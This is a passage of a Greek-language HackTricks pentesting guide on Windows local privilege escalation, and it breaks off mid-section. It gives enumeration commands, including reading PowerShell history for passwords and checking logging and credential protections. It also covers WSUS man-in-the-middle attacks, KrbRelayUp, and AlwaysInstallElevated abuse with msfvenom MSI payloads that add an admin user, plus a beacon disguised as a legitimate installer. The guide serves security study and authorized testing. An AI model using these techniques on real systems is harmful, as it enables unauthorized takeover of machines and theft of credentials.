# Ανόδου Προνομιούχων Δικαιωμάτων σε Τοπικό Επίπεδο Windows

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Καλύτερο εργαλείο για την αναζήτηση διανομέων ανόδου προνομιούχων δικαιωμάτων σε τοπικό επίπεδο Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία Windows

### Διακριτικά Πρόσβασης

**Εάν δεν γνωρίζετε τι είναι τα Διακριτικά Πρόσβασης των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Επίπεδα Ακεραιότητας

**Εάν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Ελέγχοι Ασφάλειας Windows

Υπάρχουν διάφορα πράγματα στα Windows που μπορούν να **σας εμποδίσουν από την αναγνώριση του συστήματος**, την εκτέλεση εκτελέσιμων αρχείων ή ακόμα και **την ανίχνευση των δραστηριοτήτων σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **αναγνωρίσετε** όλα αυτά τα **μηχανισμούς άμυνας** πριν ξεκινήσετε την αναγνώριση ανόδου προνομιούχων δικαιωμάτων:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Πληροφορίες Συστήματος

### Αναγνώριση πληροφοριών έκδοσης

Ελέγξτε εάν η έκδοση των Windows έχει γνωστή ευπάθεια (ελέγξτε επίσης τις εφαρμογές ενημερώσεων που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Εκμετάλλευση Εκδόσεων

Αυτή η [ιστοσελίδα](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμη για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **μαζική επιθετική επιφάνεια** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια εκμετάλλευσης στο Github:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν κάποιες διαπιστευτήριες/Χρήσιμες πληροφορίες που έχουν αποθηκευτεί στις μεταβλητές περιβάλλοντος;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Ιστορικό PowerShell

Ο PowerShell διατηρεί ένα ιστορικό των εντολών που εκτελέστηκαν στο παρελθόν. Αυτό το ιστορικό μπορεί να αποτελέσει μια πολύτιμη πηγή πληροφοριών για την εξερεύνηση και την εκμετάλλευση ενός συστήματος.

Για να προβάλετε το ιστορικό PowerShell, μπορείτε να χρησιμοποιήσετε την εντολή `Get-History`. Αυτή η εντολή θα εμφανίσει μια λίστα με τις προηγούμενες εντολές που εκτελέστηκαν, συμπεριλαμβανομένων των αναγνωριστικών εντολής, των χρόνων εκτέλεσης και των αποτελεσμάτων.

Μπορείτε επίσης να χρησιμοποιήσετε την εντολή `Clear-History` για να διαγράψετε το ιστορικό PowerShell και να καθαρίσετε τη λίστα των προηγούμενων εντολών.

Είναι σημαντικό να σημειώσετε ότι το ιστορικό PowerShell μπορεί να περιέχει ευαίσθητες πληροφορίες, όπως κωδικούς πρόσβασης ή άλλες ευαίσθητες πληροφορίες που εισάγονται κατά τη διάρκεια της εκτέλεσης εντολών. Επομένως, είναι σημαντικό να είστε προσεκτικοί κατά τη χρήση και τη διαχείριση του ιστορικού PowerShell.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία καταγραφής PowerShell Transcript

Μπορείτε να μάθετε πώς να ενεργοποιήσετε αυτήν τη λειτουργία στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Καταγραφή Ενότητας PowerShell

Λεπτομέρειες εκτέλεσης της σειράς εντολών PowerShell καταγράφονται, περιλαμβάνοντας τις εκτελεσμένες εντολές, τις κλήσεις εντολών και τμήματα των σεναρίων. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγράφονται.

Για να ενεργοποιήσετε αυτή τη λειτουργία, ακολουθήστε τις οδηγίες στην ενότητα "Αρχεία καταγραφής" της τεκμηρίωσης, επιλέγοντας **"Καταγραφή Ενοτήτων"** αντί για **"Μεταγραφή PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 γεγονότα από τα αρχεία καταγραφής του Powershell, μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Καταγραφή Εντολών Σεναρίου**

Καταγράφεται μια πλήρης καταγραφή της δραστηριότητας και του περιεχομένου της εκτέλεσης του σεναρίου, εξασφαλίζοντας ότι κάθε τμήμα κώδικα καταγράφεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί έναν πλήρη αποτύπωμα ελέγχου για κάθε δραστηριότητα, που είναι χρήσιμο για την ανάλυση της ψυχολογίας και την ανίχνευση κακόβουλης συμπεριφοράς. Με την καταγραφή όλων των δραστηριοτήτων κατά την εκτέλεση, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα γεγονότα καταγραφής για το Script Block μπορούν να βρεθούν στον Εργαλείο Προβολής Γεγονότων των Windows στη διαδρομή: **Εφαρμογές και Υπηρεσίες > Microsoft > Windows > PowerShell > Λειτουργία**.\
Για να δείτε τα τελευταία 20 γεγονότα, μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου

Οι ρυθμίσεις διαδικτύου αναφέρονται στις διάφορες ρυθμίσεις που μπορούν να εφαρμοστούν στο σύστημα για να βελτιωθεί η ασφάλεια και η ιδιωτικότητα της σύνδεσης στο διαδίκτυο. Οι παρακάτω είναι μερικές συνιστώμενες ρυθμίσεις:

#### Απενεργοποίηση αυτόματης αναζήτησης προξενητή

Η αυτόματη αναζήτηση προξενητή είναι μια ρύθμιση που επιτρέπει στο σύστημα να αναζητήσει αυτόματα έναν προξενητή δικτύου για να συνδεθεί σε αυτόν. Απενεργοποιώντας αυτήν τη ρύθμιση, μπορεί να αποτραπεί η σύνδεση σε κακόβουλους προξενητές που μπορεί να προκαλέσουν προβλήματα ασφάλειας.

#### Απενεργοποίηση αυτόματης διαμόρφωσης προξενητή

Η αυτόματη διαμόρφωση προξενητή είναι μια ρύθμιση που επιτρέπει στο σύστημα να λαμβάνει αυτόματα τις ρυθμίσεις δικτύου από έναν προξενητή. Απενεργοποιώντας αυτήν τη ρύθμιση, μπορεί να αποτραπεί η λήψη κακόβουλων ρυθμίσεων από κακόβουλους προξενητές.

#### Απενεργοποίηση αυτόματης ανίχνευσης προξενητή

Η αυτόματη ανίχνευση προξενητή είναι μια ρύθμιση που επιτρέπει στο σύστημα να ανιχνεύει αυτόματα τον προξενητή δικτύου. Απενεργοποιώντας αυτήν τη ρύθμιση, μπορεί να αποτραπεί η ανίχνευση κακόβουλων προξενητών που μπορεί να προκαλέσουν προβλήματα ασφάλειας.

#### Απενεργοποίηση αυτόματης ανανέωσης διευθύνσεων IP

Η αυτόματη ανανέωση διευθύνσεων IP είναι μια ρύθμιση που επιτρέπει στο σύστημα να ανανεώνει αυτόματα τη διεύθυνση IP που έχει αντιστοιχιστεί σε αυτό. Απενεργοποιώντας αυτήν τη ρύθμιση, μπορεί να αποτραπεί η λήψη κακόβουλων διευθύνσεων IP που μπορεί να προκαλέσουν προβλήματα ασφάλειας.

#### Απενεργοποίηση αυτόματης αναζήτησης διακομιστή προξενητή

Η αυτόματη αναζήτηση διακομιστή προξενητή είναι μια ρύθμιση που επιτρέπει στο σύστημα να αναζητήσει αυτόματα έναν διακομιστή προξενητή για να συνδεθεί σε αυτόν. Απενεργοποιώντας αυτήν τη ρύθμιση, μπορεί να αποτραπεί η σύνδεση σε κακόβουλους διακομιστές προξενητές που μπορεί να προκαλέσουν προβλήματα ασφάλειας.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Οδοί

Οι οδοί αναφέρονται στα διαθέσιμα διαμερίσματα στο σύστημα αρχείων των Windows. Κάθε οδός αντιστοιχεί σε ένα διαμέρισμα και μπορεί να περιέχει αρχεία και φακέλους. Οι οδοί συνήθως αναπαρίστανται με ένα γράμμα οδού (όπως το C: ή το D:) και μπορούν να προσπελαστούν μέσω του Windows Explorer ή της γραμμής εντολών.

Οι οδοί μπορούν να χρησιμοποιηθούν για να περιηγηθείτε στο σύστημα αρχείων, να ανοίξετε αρχεία και φακέλους, να αντιγράψετε και να μετακινήσετε αρχεία, και να εκτελέσετε εντολές σε συγκεκριμένα διαμερίσματα. Επίσης, οι οδοί μπορούν να χρησιμοποιηθούν για να αναφερθούν σε αρχεία και φακέλους κατά την εκτέλεση εντολών σε μια γραμμή εντολών ή σε ένα σενάριο προγράμματος.

Οι οδοί μπορούν να είναι απόλυτες ή σχετικές. Οι απόλυτες οδοί αναφέρονται σε ένα διαμέρισμα χρησιμοποιώντας το πλήρες μονοπάτι, ενώ οι σχετικές οδοί αναφέρονται σε ένα διαμέρισμα χρησιμοποιώντας ένα σχετικό μονοπάτι από την τρέχουσα τοποθεσία.

Οι οδοί είναι σημαντικές για την εκτέλεση επιθέσεων εκμετάλλευσης και την ανέλιξη των δικαιωμάτων σε ένα σύστημα Windows. Με τη χρήση ευπάθειων στην ασφάλεια του συστήματος αρχείων, ένας επιτιθέμενος μπορεί να αναλάβει τον έλεγχο του συστήματος και να αποκτήσει προνόμια διαχειριστή.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα εάν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας εάν ο δίκτυο χρησιμοποιεί μη-SSL ενημερώσεις WSUS εκτελώντας την παρακάτω εντολή:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Εάν λάβετε μια απάντηση όπως:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` είναι ίσο με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν το τελευταίο καταχωρίστηκε είναι ίσο με 0, τότε η καταχώριση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Αυτά είναι εκμεταλλευτικά σενάρια επίθεσης MiTM για να εισαγάγετε "ψεύτικες" ενημερώσεις στη μη-SSL κίνηση του WSUS.

Διαβάστε την έρευνα εδώ:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη έκθεση εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η αδυναμία που εκμεταλλεύεται αυτό το σφάλμα:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό μας χρήστη διαμεσολαβητή και οι ενημερώσεις των Windows χρησιμοποιούν τον διαμεσολαβητή που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, έχουμε τη δυνατότητα να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να παρεμβάλουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα ως ανώτερος χρήστης στον εξοπλισμό μας.
>
> Επιπλέον, αφού η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης το αποθετήριο πιστοποιητικών του. Αν δημιουργήσουμε ένα αυτο-υπογεγραμμένο πιστοποιητικό για το όνομα κεντρικού υπολογιστή του WSUS και προσθέσουμε αυτό το πιστοποιητικό στο αποθετήριο πιστοποιητικών του τρέχοντος χρήστη, θα μπορούμε να παρεμβάλουμε την κίνηση του WSUS τόσο με HTTP όσο και με HTTPS. Ο WSUS δεν χρησιμοποιεί μηχανισμούς παρόμοιους με το HSTS για να εφαρμόσει μια επικύρωση τύπου εμπιστοσύνης-στην-πρώτη-χρήση στο πιστοποιητικό. Αν το πιστοποιητικό που παρουσιάζεται είναι εμπιστευμένο από τον χρήστη και έχει το σωστό όνομα κεντρικού υπολογιστή, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## KrbRelayUp

Υπάρχει μια ευπάθεια **τοπικής ανόδου προνομίων** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **δεν επιβάλλεται η υπογραφή LDAP,** οι χρήστες έχουν δικαιώματα αυτο-δικαιωμάτων που τους επιτρέπουν να διαμορφώνουν **Resource-Based Constrained Delegation (RBCD),** και η δυνατότητα για τους χρήστες να δημιουργούν υπολογιστές εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **απαιτήσεις** πληρούνται χρησιμοποιώντας τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε την εκμετάλλευση στο [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, ανατρέξτε στο [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 καταχωρίστηκαν **ενεργοποιημένα** (η τιμή είναι **0x1**), τότε οι χρήστες οποιουδήποτε προνομίου μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Φορτία Metasploit

Το Metasploit είναι ένα εργαλείο που χρησιμοποιείται ευρέως στον κόσμο του χάκινγκ για να εκτελέσει επιθέσεις και να εκμεταλλευτεί ευπάθειες σε συστήματα. Ένα από τα ισχυρότερα χαρακτηριστικά του Metasploit είναι η δυνατότητα να χρησιμοποιεί διάφορα φορτία για να εκτελέσει επιθέσεις.

Ένα φορτίο (payload) στο Metasploit είναι ένα κομμάτι κώδικα που εκτελείται στον στόχο μετά την εκμετάλλευση μιας ευπάθειας. Τα φορτία μπορούν να χρησιμοποιηθούν για να αποκτήσετε προνομιακά δικαιώματα, να αποκτήσετε πρόσβαση σε συστήματα ή να εκτελέσετε εντολές στον στόχο.

Το Metasploit παρέχει μια ποικιλία φορτίων που μπορούν να χρησιμοποιηθούν για διάφορες επιθέσεις. Ορισμένα από τα δημοφιλέστερα φορτία περιλαμβάνουν:

- **reverse_tcp**: Συνδέεται στον επιτιφέρον από τον στόχο και επιτρέπει την απομακρυσμένη εκτέλεση εντολών.
- **bind_tcp**: Ακούει για συνδέσεις από τον επιτιφέρον και επιτρέπει την απομακρυσμένη εκτέλεση εντολών.
- **meterpreter**: Παρέχει μια πλήρη και ισχυρή κονσόλα για τον έλεγχο του στόχου.
- **shell_reverse_tcp**: Συνδέεται στον επιτιφέρον από τον στόχο και παρέχει μια απλή κονσόλα.

Αυτά είναι μόνο μερικά παραδείγματα φορτίων που παρέχονται από το Metasploit. Μπορείτε να επιλέξετε το κατάλληλο φορτίο ανάλογα με τον στόχο και τον τύπο της επίθεσης που θέλετε να εκτελέσετε.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Εάν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας τον ενότητα **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε ένα δυαδικό αρχείο Windows MSI μέσα στον τρέχοντα φάκελο για την ανύψωση δικαιωμάτων. Αυτό το σενάριο γράφει ένα προεπιλεγμένο εγκαταστάτη MSI που ζητάει την προσθήκη χρήστη/ομάδας (επομένως θα χρειαστείτε πρόσβαση στο GUI):
```
Write-UserAddMSI
```
Απλά εκτελέστε το δημιουργημένο δυαδικό αρχείο για να αναβαθμίσετε τα δικαιώματα.

### Περιτύλιξη MSI

Διαβάστε αυτό το εγχειρίδιο για να μάθετε πώς να δημιουργήσετε ένα περιτύλιγμα MSI χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να περιτυλίξετε ένα αρχείο "**.bat**" αν θέλετε απλά να εκτελέσετε γραμμές εντολών.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Δημιουργία MSI με το WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Δημιουργία MSI με το Visual Studio

* **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στη διαδρομή `C:\privesc\beacon.exe`
* Ανοίξτε το **Visual Studio**, επιλέξτε **Δημιουργία νέου έργου** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το έργο **Setup Wizard** και κάντε κλικ στο **Επόμενο**.
* Δώστε ένα όνομα στο έργο, όπως **AlwaysPrivesc**, χρησιμοποιήστε τη διαδρομή **`C:\privesc`** για την τοποθεσία, επιλέξτε **τοποθέτηση λύσης και έργου στον ίδιο φάκελο** και κάντε κλικ στο **Δημιουργία**.
* Συνεχίστε να κάνετε κλικ στο **Επόμενο** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων προς συμπερίληψη). Κάντε κλικ στο **Προσθήκη** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Τελειώσατε**.
* Επισημάνετε το έργο **AlwaysPrivesc** στον **Εξερευνητή λύσεων** και στις **Ιδιότητες**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
* Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως ο **Συγγραφέας** και ο **Κατασκευαστής**, που μπορούν να καταστήσουν την εγκατεστημένη εφαρμογή πιο νόμιμη.
* Δεξί κλικ στο έργο και επιλέξτε **Προβολή > Προσαρμοσμένες ενέργειες**.
* Δεξί κλικ στην **Εγκατάσταση** και επιλέξτε **Προσθήκη προσαρμοσμένης ενέργειας**.
* Κάντε διπλό κλικ στο **Φάκελος εφαρμογής**, επιλέξτε το αρχείο **beacon.exe** σας και κάντε κλικ στο **ΟΚ**. Αυτό θα εξασφαλίσει ότι το payload beacon θα εκτελεστεί αμέσως μόλις εκτελεστεί ο εγκαταστάτης.
* Στις **Ιδιότητες προσαρμοσμένης ενέργειας**, αλλάξτε το **Run64Bit** σε **True**.
* Τέλος, **κάντε την κατασκευή**.
* Εάν εμφανιστεί το προειδοποιητικό μήνυμα `Το αρχείο 'beacon-tcp.exe' που στοχεύει στο 'x64' δεν είναι συμβατό με την πλατφόρμα προορισμού του έργου 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always\_install\_elevated_

## Αντιιικά και ανιχνευτές

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις αποφασίζουν τι **καταγράφεται**, οπότε θα πρέπει να είστε προσεκτικοί.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Η Προώθηση Συμβάντων των Windows (Windows Event Forwarding - WEF) είναι ενδιαφέρουσα για να γνωρίζετε πού αποστέλλονται τα αρχεία καταγραφής.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** είναι σχεδιασμένο για τη **διαχείριση των τοπικών κωδικών διαχειριστή**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε έναν τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν λάβει επαρκή δικαιώματα μέσω των ACLs, επιτρέποντάς τους να προβάλλουν τους τοπικούς κωδικούς διαχειριστή αν εξουσιοδοτηθούν.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Εάν είναι ενεργό, **οι κωδικοί σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες σχετικά με το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Προστασία LSA

Από την έκδοση **Windows 8.1** και μετά, η Microsoft εισήγαγε ενισχυμένη προστασία για την Τοπική Αρχή Ασφαλείας (LSA) για να **αποκλείσει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να εισάγουν κώδικα, ενισχύοντας περαιτέρω το σύστημα.\
[**Περισσότερες πληροφορίες για την προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Προστασία διαπιστευτηρίων

Το **Credential Guard** εισήχθη στα **Windows 10**. Ο σκοπός του είναι να προστατεύει τα διαπιστευτήρια που αποθηκεύονται σε ένα συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.
[**Περισσότερες πληροφορίες για το Credential Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Κρυφές Πιστοποιήσεις

Οι **πιστοποιήσεις τομέα** επαληθεύονται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη επαληθεύονται από ένα εγγεγραμμένο πακέτο ασφαλείας, συνήθως δημιουργούνται πιστοποιήσεις τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τις Κρυφές Πιστοποιήσεις εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Θα πρέπει να ελέγξετε εάν οποιαδήποτε από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέρουσες άδειες.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

Εάν ανήκετε σε κάποια ομάδα με προνόμια, μπορείτε να αναβαθμίσετε τα προνόμιά σας. Μάθετε περισσότερα για τις ομάδες με προνόμια και πώς να τις καταχραστείτε για να αναβαθμίσετε τα προνόμιά σας εδώ:

